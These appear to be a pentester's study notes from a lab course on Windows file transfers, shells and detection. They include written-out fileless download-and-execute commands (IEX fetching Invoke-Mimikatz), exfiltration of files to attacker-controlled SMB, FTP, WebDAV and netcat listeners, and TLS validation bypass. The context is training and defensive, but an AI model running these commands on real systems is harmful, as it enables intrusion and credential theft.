    		+ When you wish to interact with .NET objects instead of text output.
    		+ When being stealthy is of lesser concern.
    		+ If you are planning to interact with cloud-based services and hosts.
    		+ If your scripts set and use Aliases.

* WSL and PowerShell For Linux

	> The Windows Subsystem for Linux is a powerful new tool that has been introduced to Windows hosts that provides a virtual Linux environment built into your host. We mention this because the rapidly changing landscape of operating systems may very well allow for novel ways of gaining access to a host. When writing this module, several examples of malware in the wild were attempting to utilize Python3 and Linux binaries to download and install payloads onto a Windows host via WSL. Much like in this post here, attackers are also using built-in Python libraries that are native to both Windows and Linux alongside PowerShell to perform other actions on the host. One other thing to note is currently, any network requests or functions executed to or from the WSL instance are not parsed by the Windows Firewall and Windows Defender, making it a bit of a blind spot on the host.
	> The same issues can currently be found via PowerShell Core, which can be installed on Linux operating systems and carry over many normal PowerShell functions. These two concepts are exceptionally sneaky because, to date, not much is known about the vectors of attack or ways to watch for them. But attacks aimed at these features have been seen to avoid AV and EDR detection mechanisms. These concepts are a bit advanced for this module but look for them in a future module.

-=-=-
[+] Infiltrating Unix/Linux
    > One detail that can be overlooked when relying on MSF to find an exploit module for a specific application is the version of MSF. There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their repos on github. We could do an even more specific search using a search engine: rConfig 3.9.6 exploit metasploit github

    > This search can point us to the source code for an exploit module called rconfig_vendors_auth_file_upload_rce.rb. This exploit can get us a shell session on a target Linux box running rConfig 3.9.6. If this exploit did not show up in the MSF search, we can copy the code from this repo onto our local attack box and save it in the directory that our local install of MSF is referencing. To do this, we can issue this command on our attack box:
	locate exploits
    > We want to look for the directories in the output associated with Metasploit Framework. On Pwnbox, Metasploit exploit modules are kept in:

	/usr/share/metasploit-framework/modules/exploits

    > We can copy the code into a file and save it in /usr/share/metasploit-framework/modules/exploits/linux/http similar to where they are storing the code in the GitHub repo. We should also keep msf up to date using the command msfupdate or your local package manager. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has .rb as the extension. All modules in MSF are written in Ruby


-=-=
[+] Detection and Prevention
* Monitoring 
    > When it comes to looking for and identifying active shells, payload delivery and execution, and potential attempts to subvert our defenses, we have many different options to utilize to detect and respond to these events. Before talking about data sources and tools we can use, let's take a second to talk about the MITRE ATT&CK Framework and define the techniques and tactics being utilized by attackers. The ATT&CK Framework as defined by MITRE, is "a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations."

    > Keeping the framework in mind, three of the most notable techniques we can tie to Shells & Payloads are listed below in the table with descriptions.
        + Notable MITRE ATT&CK Tactics and Techniques:

Tactic / Technique	Description
Initial Access	    Attackers will attempt to gain initial access by compromising a public-facing host or service such as web Applications, 
                    misconfigured services such as SMB or authentication protocols, and/or bugs in a public-facing host that introduce a vulnerability. 
                    This is often done on some form of bastion host and provides the attacker with a foothold in the network but not yet full access. 
                    For more information on initial access, especially via Web Applications, check out the OWASP Top Ten or read further in the Mitre Att&ck framework.
Execution	        This technique depends on code supplied and planted by an attacker running on the victim host. The Shells & Payloads module focuses 
                    mainly on this tactic. We utilize many different payloads, delivery methods, and shell scripting solutions to access a host. 
                    This can be anything from the execution of commands within our web browser to get execution and access on a Web 
                    Application, issuing a PowerShell one-liner via PsExec, taking advantage of a publicly released exploit or zero-day in conjunction with a 
                    framework such as Metasploit, or uploading a file to a host via many different protocols and calling it remotely to receive a callback.
Command & Control	Command and Control (C2) can be looked at as the culmination of our efforts within this module. We gain access to a host and establish 
                    some mechanism for continued and/or interactive access via code execution, then utilize that access to perform follow on actions on objectives 
                    within the victim network. The use of standard ports and protocols within the victim network to issue commands and receive output from the 
                    victim is common. This can appear as anything from normal web traffic over HTTP/S, commands issued via other common external protocols such as 
                    DNS and NTP, and even the use of common allowed applications such as Slack, Discord, or MS Teams to issue commands and receive check-ins. C2 can 
                    have various levels of sophistication varying from basic clear text channels like Netcat to utilizing encrypted and obfuscated protocols along 
                    with complex traffic routes via proxies, redirectors, and VPNs.

+ Events To Watch For:

    > File uploads: Especially with Web Applications, file uploads are a common method of acquiring a shell on a host besides direct command execution in the browser. Pay attention to application logs to determine if anyone has uploaded anything potentially malicious. The use of firewalls and anti-virus can add more layers to your security posture around the site. Any host exposed to the internet from your network should be sufficiently hardened and monitored.
    > Suspicious non-admin user actions: Looking for simple things like normal users issuing commands via Bash or cmd can be a significant indicator of compromise. When was the last time an average user, much less an admin, had to issue the command whoami on a host? Users connecting to a share on another host in the network over SMB that is not a normal infrastructure share can also be suspicious. This type of interaction usually is end host to infrastructure server, not end host to end host. Enabling security measures such as logging all user interactions, PowerShell logging, and other features that take note when a shell interface is used will provide you with more insight.
    > Anomalous network sessions: Users tend to have a pattern they follow for network interaction. They visit the same websites, use the same applications, and often perform those actions multiple times a day like clockwork. Logging and parsing NetFlow data can be a great way to spot anomalous network traffic. Looking at things such as top talkers, or unique site visits, watching for a heartbeat on a nonstandard port (like 4444, the default port used by Meterpreter), and monitoring any remote login attempts or bulk GET / POST requests in short amounts of time can all be indicators of compromise or attempted exploitation. Using tools like network monitors, firewall logs, and SIEMS can help bring a bit of order to the chaos that is network traffic.

+ Establish Network Visibility

    > Much like identifying and then using various shells & payloads, detection & prevention requires a detailed understanding of the systems and overall network environment you are trying to protect. It's always essential to have good documentation practices so individuals responsible for keeping the environment secure can have consistent visibility of the devices, data, and traffic flow in the environments they administer. Developing & maintaining visual network topology diagrams can help visualize network traffic flow. Newer tools like netbrain(https://www.netbraintech.com/) may be good to research as they combine visual diagraming that can be achieved with tools like Draw.io(https://draw.io/), documentation and remote management. Interactive visual network topologies allow you to interact with the routers, network firewalls, IDS/IPS appliances, switches, and hosts (clients). Tools like this are becoming more common to use as it can be challenging to keep the visibility of the network updated, especially in larger environments that are constantly growing.
    > Some network device vendors like Cisco Meraki, Ubiquiti, Check Point, and Palo Alto Networks are building layer 7 visibility (like layer 7 of the OSI model) into their network devices and moving the management capabilities to cloud-based network controllers. This means admins log in to a web portal to manage all the network devices in the environment. A visual dashboard is often provided with these cloud-based network controllers making it easier to have a baseline of the traffic usage, network protocols, applications, and inbound & outbound traffic. Having and understanding the baseline of your network will make any deviation from the norm extremely visible. The faster you can react and triage any potential issue, the less time for possible leaks, destruction of data, or worse.
    > Keep in mind that if a payload is successfully executed, it will need to communicate over the network, so this is why network visibility is essential within the context of shells & payloads. Having a network security appliance capable of deep packet inspection can often act as an anti-virus for the network. Some of the payloads we discussed could get detected & blocked at the network level if successfully executed on the hosts. This is especially easy to detect if traffic is not encrypted. When we used Netcat in the bind & reverse shell sections, the traffic passing between the source and destination (target) was not encrypted. Someone could capture that traffic and see every command we sent between our attack box and the target


+ Protecting end devices
    > End devices are the devices that connect at the "end" of a network. This means they are either the source or destination of data transmission. Some examples of end devices would be:
        Workstations (employees computers)
        Servers (providing various services on the network)
        Printers
        Network Attached Storage (NAS)
        Cameras
        Smart TVs
        Smart Speakers

    > We should prioritize the protection of these kinds of devices, especially those that run an operating system with a CLI that can be remotely accessed. The same interface that makes it easy to administer and automate tasks on a device can make it a good target for attackers. As simple as this seems, having anti-virus installed & enabled is a great start. The most common successful attack vector besides misconfiguration is the human element. All it takes is for a user to click a link or open a file, and they can be compromised. Having monitoring and alerting on your end devices can help detect and potentially prevent issues before they happen.
    > On Windows systems, Windows Defender (also known as Windows Security or Microsoft Defender) is present at install and should be left enabled. Also, ensuring the Defender Firewall is left enabled with all profiles (Domain, Private and Public) left on. Only make exceptions for approved applications based on a change management process. Establish a patch management strategy (if not already established) to ensure that all hosts are receiving updates shortly after Microsoft releases them. All of this applies to servers hosting shared resources and websites as well. Though it can slow performance, AV on a server can prevent the execution of a payload and the establishment of a shell session with a malicious attacker's system.


-=-==
sslscan amazon.com
-=-=-=-=-
File transfers
> URLs
  * https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
  * https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control
  * https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
  * https://github.com/itm4n/PrintSpoofer
  * https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
  * https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
Imagine the following scenario
  > During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer PowerUp.ps1 (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the Application Control Policy. We perform our local enumeration manually and find that we have SeImpersonatePrivilege. We need to transfer a binary to our target machine to escalate privileges using the PrintSpoofer tool. We then try to use Certutil to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the Impacket smbserver tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user. 
  > Understanding different ways to perform file transfers and how networks operate can help us accomplish our goals during an assessment. We must be aware of host controls that may prevent our actions, like application whitelisting or AV/EDR blocking specific applications or activities. File transfers are also affected by network devices such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.
[+] File transfer methods
  * Windows File Transfer Methods
    > The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let's use the Microsoft Astaroth Attack blog post as an example of an advanced persistent threat (APT).
      + The blog post starts out talking about fileless threats. The term fileless suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.
      + The Astaroth attack generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the WMIC tool with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the Bitsadmin tool.
      + All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The regsvr32 tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the Userinit process.

* Download operations
  > We have access to the machine MS02, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple File Download methods.

[+] PowerShell Base64 Encode & Decode
  > Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.
  > An essential step in using this method is to ensure the file you encode and decode is correct. We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.
     md5sum id_rsa
     cat id_rsa | base64 -w 0;echo 
  > We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
    [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
  > Finally, we can confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.
    Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

  > NOTE: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. 

[+] PowerShell Web Downloads
  > Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

  > PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient(https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over HTTP, HTTPS or FTP. The following table(https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:
      Method	            Description
      OpenRead	          Returns the data from a resource as a Stream(https://learn.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0)
      OpenReadAsync	      Returns the data from a resource without blocking the calling thread.
      DownloadData	      Downloads data from a resource and returns a Byte array.
      DownloadDataAsync	  Downloads data from a resource and returns a Byte array without blocking the calling thread.
      DownloadFile	      Downloads data from a resource to a local file.
      DownloadFileAsync	  Downloads data from a resource to a local file without blocking the calling thread.
      DownloadString	    Downloads a String from a resource and returns a String.
      DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.

  * PowerShell DownloadFile Method
    > We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.
      PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
      PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
      PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
      PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com

  * Powershell DownloadString - Fileless method
    > As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression(https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias IEX.
      PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
    > IEX also accepts pipeline input.
      PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
  
  * PowerShell Invoke-WebRequest  
    > From PowerShell 3.0 onwards, the Invoke-WebRequest(https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
      PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    > Harmj0y has compiled an extensive list of PowerShell download cradles here(https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.
    
[+] Common Errors with PowerShell
  > There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter -UseBasicParsing.
    PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX #Error
    PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
  > Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
    PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') #Error
    PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

[+] SMB Downloads
  > The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

  > We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.
    m1l0js@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
  > To download a file from the SMB server to the current working directory, we can use the following command:
    C:\htb> copy \\192.168.220.133\share\nc.exe
  > New versions of Windows block unauthenticated guest access, as we can see in the following command:
    C:\htb> copy \\192.168.220.133\share\nc.exe
    You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
  > To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:
    m1l0js@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
    #With net view \\10.10.16.47 ==> We can see the remote shares
    C:\htb> net use n: \\192.168.220.133\share /user:test test
    The command completed successfully.
    C:\htb> copy n:\nc.exe
        1 file(s) copied.
  > Note: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

[+] FTP Downloads
  > Another way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.
  > We can configure an FTP Server in our attack host using Python3 pyftpdlib module.
    m1l0js@htb[/htb]$ sudo pip3 install pyftpdlib
  > Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.
    m1l0js@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
  > After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient.
    PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
  > When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    C:\htb> echo USER anonymous >> ftpcommand.txt
    C:\htb> echo binary >> ftpcommand.txt
    C:\htb> echo GET file.txt >> ftpcommand.txt
    C:\htb> echo bye >> ftpcommand.txt
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ftp> open 192.168.49.128
    Log in with USER and PASS first.
    ftp> USER anonymous
    
    ftp> GET file.txt
    ftp> bye
    
    C:\htb>more file.txt
    This is a test file

[+] Upload Operationswindows file transfer methods
  > There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host. We can use the same methods we used for download operation but now for Uploads. Let's see how we can accomplish uploading files in various ways.
  * PowerShell Base64 Encode & Decode
    > We saw how to decode a base64 string using Powershell. Now, let's do the reverse operation and encode a file so we can decode it on our attack host.
      PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
      PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
    > We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.
      m1l0js@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
    > md5sum hosts
  
  * PowerShell Web Uploads
    > PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads, which is not a default option in most common webserver utilities.

    > For our web server, we can use uploadserver (https://github.com/Densaugeo/uploadserver), an extended module of the Python HTTP.server module(https://docs.python.org/3/library/http.server.html), which includes a file upload page. Let's install it and start the webserver. 
      pip3 install uploadserver
      python3 -m uploadserver
    > Now we can use a PowerShell script PSUpload.ps1(https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses Invoke-WebRequest to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. Let's attempt to upload the host file from our Windows host.
      PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
      PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
      [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
      [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
    
    * PowerShell Base64 Web Upload
      > Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
        PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
        PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
      > We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
        m1l0js@htb[/htb]$ nc -lvnp 8000
        listening on [any] 8000 ...
        connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
        POST / HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
        Content-Type: application/x-www-form-urlencoded
        Host: 192.168.49.128:8000
        Content-Length: 1820
        Connection: Keep-Alive
        
        IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
        ...SNIP...

        m1l0js@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
  
  * SMB Uploads 
    > We previously discussed that companies usually allow outbound traffic using HTTP (TCP/80) and HTTPS (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post Preventing SMB traffic from lateral connections and entering or leaving the network => (https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)

    > An alternative is to run SMB over HTTP with WebDav. WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

    > When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share testing3, and because it didn't find anything with SMB, it uses HTTP.
    
    [+] Configuring WebDav Server
      > To set up our WebDav server, we need to install two Python modules, wsgidav and cheroot (you can read more about this implementation here: wsgidav github (https://github.com/mar10/wsgidav)). After installing them, we run the wsgidav application in the target directory.
        m1l0js@htb[/htb]$ sudo pip install wsgidav cheroot
        m1l0js@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
      > Now we can attempt to connect to the share using the DavWWWRoot directory.
        C:\htb> dir \\192.168.49.128\DavWWWRoot
      > Note: DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server. You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder
      > uploading files using SMB
        C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
        C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
      > Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

  * FTP Uploads
    > Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module pyftpdlib, we need to specify the option --write to allow clients to upload files to our attack host.
      m1l0js@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
    > Now let's use the PowerShell upload function to upload a file to our FTP Server.
      PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
    > Create a command file for the FTP client to upload a file
      C:\htb> echo open 192.168.49.128 > ftpcommand.txt
      C:\htb> echo USER anonymous >> ftpcommand.txt
      C:\htb> echo binary >> ftpcommand.txt
      C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
      C:\htb> echo bye >> ftpcommand.txt
